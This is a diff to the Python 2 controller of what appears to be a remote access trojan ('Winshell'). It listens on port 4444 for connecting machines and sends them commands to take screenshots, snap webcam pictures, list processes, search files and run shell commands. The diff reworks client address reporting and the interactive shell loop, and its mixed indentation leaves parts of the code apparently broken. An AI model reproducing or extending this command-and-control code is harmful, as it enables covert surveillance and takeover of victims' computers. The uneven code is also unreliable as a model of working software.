@@ -10,11 +10,9 @@ class Network:
 		self.all_addresses = []
 
 	def wait_connections(self, green, default, blue):
-		global c
+		global c, address
 		host = ""
 		port = 4444
-
-
 
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.bind((host, port))
@@ -23,10 +21,11 @@ class Network:
 		while True:
 			c, addr = s.accept()
 			c.setblocking(1)
+                        address = c.recv(1024)
 
 			self.all_connections.append(c)
-			self.all_addresses.append(addr[0])
-			print "\n{}[+]{} {} Connected !".format(green, default, addr[0])
+			self.all_addresses.append(address)
+			print "\n{}[+]{} {} Connected !".format(green, default, address)
 
 	def list_clients(self, blue, default, send):
 		clients = ""
@@ -88,7 +87,7 @@ class Network:
 	def screenshot(self, cmd, green, default):
 		c.send(cmd)
 		c.recv(1024)
-		downloadFile(c, "screenshotFS.png",   red, default)
+		downloadFile(c, "screenshotFS.png",  blue, red, green, default)
 		print "{}[+]{} Screenshot saved as : '{}/screenshotFS.png'".format(green, default, os.getcwd())
 
 	def printrecv(self, cmd, red, default):
@@ -100,7 +99,7 @@ class Network:
 	def webcam_snap(self, cmd, blue, red, green, default):
 		c.send(cmd)
 		c.recv(1024)
-		downloadFile(c, "wpicture.png", red, default)
+		downloadFile(c, "wpicture.png", blue, red, green, default)
 		print "{}[+]{} Picture saved as : {}/wpicture.png".format(green, default, os.getcwd())
 
 	def ls(self, cmd):
@@ -115,9 +114,7 @@ class Network:
 	def getcmd(self):
 		c.send("pwd")
 		pwd = c.recv(1024)
-		c.send("hostname")
-		hostname = c.recv(1024)
-		return hostname, pwd
+		return pwd
 
 	def ps(self, cmd):
 		c.send(cmd)
@@ -157,8 +154,8 @@ class Network:
 				self.ls(cmd)
 
 			elif cmd == "getcmd":
-				hostname, pwd = self.getcmd()
-				return hostname, pwd
+				pwd = self.getcmd()
+				return address, pwd
 
 			elif cmd == "ps" or cmd[:7] == "search ":
 				self.ps(cmd)
@@ -259,25 +256,21 @@ class Console:
 		print " force2 <arg>     force a os.system"
 
 	def winshellI(self):
-			while True:
-				hostname, pwd = self.Connection.send_command("getcmd")
-				print
-				cmd = raw_input("{}[{} {}{}]${} ".format(self.green, hostname, self.blue, pwd, self.default))
-				if cmd == "":
-					continue
+	    while True:
+	        hostname, pwd = self.Connection.send_command("getcmd")
+                if pwd == "":
+                    print
+                    return
+		print
+		cmd = raw_input("{}[{} {}{}]${} ".format(self.green, hostname, self.blue, pwd, self.default))
+		if cmd == "":
+		    continue
 	
-				elif cmd == "help" or cmd == "?":
-					self.help()
+		elif cmd == "help" or cmd == "?":
+		    self.help()
 	
-				elif cmd == "quit":
-					print
-					return
-	
-				else:
-					self.Connection.send_command(cmd, self.blue, self.green, self.red, self.default)		
-		#except:
-		#	print 
-		#	return
+		else:
+		    self.Connection.send_command(cmd, self.blue, self.green, self.red, self.default)		
 def Main():
 	Winshell = Console()
 	Winshell.menu()
